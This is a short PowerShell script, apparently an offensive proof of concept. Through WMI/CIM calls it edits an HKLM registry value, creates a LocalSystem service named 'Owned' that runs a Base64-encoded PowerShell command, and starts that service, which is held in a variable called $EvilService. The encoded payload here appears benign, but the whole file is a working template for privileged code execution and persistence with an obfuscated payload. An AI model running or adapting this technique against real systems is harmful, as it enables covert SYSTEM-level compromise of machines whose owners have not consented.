Invoke-CimMethod -Namespace root/default -ClassName StdregProv -MethodName SetStringValue -Arguments @{
	hDefKey = [UInt32] 2147483650 # HKLM
	sSubKeyName = 'SYSTEM\CurrentControlSet\Control'
	sValueName = 'WaitToKillServiceTimeout'
	sValue = '120000'
}
 
Invoke-CimMethod -ClassName Win32_Service -MethodName Create -Arguments @{
	StartMode = 'Manual'
	StartName = 'LocalSystem'
	ServiceType = ([Byte] 16)
	ErrorControl = ([Byte] 1)
	Name = 'Owned'
	DisplayName = 'Owned'
	DesktopInteract  = $False
	PathName = "cmd /c $Env:windir\System32\WindowsPowerShell\v1.0\powershell.exe -EncodedCommand RwBlAHQALQBEAGEAdABlACAAfAAgAE8AdQB0AC0ARgBpAGwAZQAgAEMAOgBcAFQAZQBzAHQAXABvAHcAbgBlAGQALgB0AHgAdAAgAC0AQQBwAHAAZQBuAGQA -NonInteractive -NoProfile"
}
 
$EvilService = Get-CimInstance -ClassName Win32_Service -Filter 'Name = "Owned"'	
Invoke-CimMethod -MethodName StartService -InputObject $EvilService
#Invoke-CimMethod -MethodName Delete -InputObject $EvilService